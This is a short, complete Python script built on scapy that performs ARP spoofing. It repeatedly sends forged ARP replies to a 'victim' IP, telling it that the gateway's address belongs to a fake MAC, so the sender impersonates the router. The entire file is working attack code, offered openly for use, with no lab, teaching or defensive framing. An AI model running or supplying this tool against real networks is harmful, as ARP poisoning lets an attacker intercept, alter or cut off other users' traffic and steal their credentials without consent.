# ⚠️ Requires: pip install scapy
# ⚠️ Must be run as root (sudo)

from scapy.all import ARP, send
import time
import argparse

parser = argparse.ArgumentParser(description="ARP spoofer — impersonate gateway")
parser.add_argument("--target", required=True, help="Victim IP address")
parser.add_argument("--gateway", required=True, help="Gateway/router IP address")
parser.add_argument("--mac", default="de:ad:be:ef:00:01", help="Fake MAC address (default: de:ad:be:ef:00:01)")
parser.add_argument("--interval", type=float, default=2.0, help="Seconds between packets (default: 2)")
args = parser.parse_args()

packet = ARP(op=2, pdst=args.target, psrc=args.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=args.mac)

print(f"[*] Spoofing {args.target} into thinking we're {args.gateway}...")
try:
    while True:
        send(packet, verbose=False)
        print("[+] ARP packet sent")
        time.sleep(args.interval)
except KeyboardInterrupt:
    print("\n[!] Stopped spoofing.")
